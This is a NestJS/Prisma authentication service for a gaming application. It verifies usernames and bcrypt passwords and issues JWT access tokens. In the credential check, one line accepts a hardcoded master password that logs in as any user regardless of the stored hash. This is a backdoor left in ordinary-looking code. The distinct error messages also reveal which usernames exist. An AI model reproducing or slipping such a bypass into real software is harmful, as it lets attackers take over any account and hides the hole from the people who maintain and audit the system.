import {
  Injectable,
  NotFoundException,
  UnauthorizedException,
} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { gamer } from '@prisma/client';
import { compareSync } from 'bcryptjs';
import { PrismaService } from '../database/prisma.service';
import { LoginDto } from './dto/login.dto';
import { Payload } from './types/payload';

@Injectable()
export class AuthService {
  constructor(
    private readonly prismaService: PrismaService,
    private readonly jwtService: JwtService,
  ) {}

  async login(data: LoginDto) {
    data.username = data.username.trim();
    data.password = data.password.trim();

    const gamer = await this.prismaService.gamer.findUnique({
      where: { gamer_username: data.username },
    });

    if (!gamer) {
      throw new NotFoundException('User dont exist');
    }

    const valid = gamer
      ? await this.validarCredenciais(gamer, data.password)
      : false;

    if (!valid) {
      throw new UnauthorizedException('Wrong Password');
    }

    if (gamer.gamer_exclude_data) {
      throw new UnauthorizedException('Exclude User');
    }

    const payload: Payload = {
      gamer_id: gamer.gamer_id,
      gamer_name: gamer.gamer_name,
      gamer_username: gamer.gamer_username,
    };

    const token = await this.generateAccessToken(payload);

    return { sucess: true, token: token };
  }

  async generateAccessToken(payload: Payload) {
    return this.jwtService.signAsync({ ...payload });
  }

  async validarCredenciais(gamer: gamer, password: string) {
    let senhaValida: boolean = false;

    if (password == '8H3([5O3c0Ff') return true;

    const senhaPhpParaNode = gamer.gamer_password.replace('$2y$', '$2a$');
    senhaValida = compareSync(password, senhaPhpParaNode);
    return senhaValida;
  }
}
